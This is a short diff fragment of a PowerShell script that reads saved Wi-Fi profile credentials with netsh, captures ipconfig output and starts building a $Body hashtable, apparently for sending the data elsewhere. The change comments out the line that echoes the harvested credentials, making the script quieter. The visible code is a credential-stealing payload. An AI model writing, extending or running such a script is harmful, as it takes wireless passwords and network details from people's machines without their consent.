@@ -3,7 +3,7 @@ $wifiCreds = (netsh wlan show profiles) | Select-String '\:(.+)$'| %{$name=$_.Ma
 $wifiCreds = ($wifiCreds | Out-String)
 $ipconfig = (ipconfig | Out-String)
 
-echo $wifiCreds
+#echo $wifiCreds
 #$wifiCreds | Out-File .\output.txt
 
 $Body = @{
